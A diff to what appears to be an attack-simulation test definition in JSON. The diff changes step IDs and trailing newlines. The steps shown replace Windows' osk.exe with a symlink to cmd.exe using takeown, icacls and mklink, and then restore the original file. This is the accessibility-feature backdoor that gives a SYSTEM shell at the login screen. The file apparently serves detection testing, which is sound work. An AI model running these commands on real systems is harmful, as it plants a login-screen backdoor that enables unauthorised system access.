@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "b9baf58d-14f1-437d-a83d-8c0d8b3ca957",
+      "id": "fab59bcc-cc7b-465d-b080-295e3cca8120",
       "type": "execute-command",
       "data": {
-        "command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe\n",
+        "command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe",
         "command_type": "command_prompt"
       },
       "elevation_required": true
     },
     {
-      "id": "94e1978d-48cc-412d-a156-1fb1dd7e7b04",
+      "id": "9c9010ab-fcb7-48db-8fd9-c7ceb245380f",
       "type": "execute-command",
       "data": {
-        "command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX\n",
+        "command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX",
         "command_type": "command_prompt"
       },
       "elevation_required": true
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "b9baf58d-14f1-437d-a83d-8c0d8b3ca957",
+      "s": "fab59bcc-cc7b-465d-b080-295e3cca8120",
       "p": "on-success",
-      "o": "94e1978d-48cc-412d-a156-1fb1dd7e7b04"
+      "o": "9c9010ab-fcb7-48db-8fd9-c7ceb245380f"
     },
     {
-      "s": "b9baf58d-14f1-437d-a83d-8c0d8b3ca957",
+      "s": "fab59bcc-cc7b-465d-b080-295e3cca8120",
       "p": "on-failure",
-      "o": "94e1978d-48cc-412d-a156-1fb1dd7e7b04"
+      "o": "9c9010ab-fcb7-48db-8fd9-c7ceb245380f"
     }
   ],
   "tags": [
